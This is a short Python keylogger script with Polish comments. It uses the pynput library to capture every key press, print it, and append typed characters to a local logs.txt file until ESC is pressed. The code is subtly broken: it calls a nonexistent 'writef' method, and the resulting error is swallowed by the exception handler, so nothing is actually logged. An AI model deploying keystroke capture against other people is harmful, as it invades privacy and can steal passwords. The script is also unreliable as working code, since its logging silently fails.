from pynput import keyboard




# Funkcja śledząca klikanie klawiszy
def on_press(key):
    try:
        # Wyswietlamy znak (litera, cyfra)
        print(f"Wciśnięto {key.char}")
        # Zapisujemy wciśnięty klawisz do logs.txt
        with open("logs.txt", "a") as file:
            file.writef(key.char)
        
    except AttributeError:
        # Jesli klawisz typu shift,ctrl wypisz go
        print(f"Niestandardowy klawisz: {key}")



# Funkcja gdy puścimy klawisz
def on_release(key):
    # Printujemy który klawisz został puszczony
    print(f"Puszczony klawisz: {key}")
    # zakończ nasłuchiwanie jeśli wciśniemy ESC
    if key == keyboard.Key.esc:
        return False


# Uruchom
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()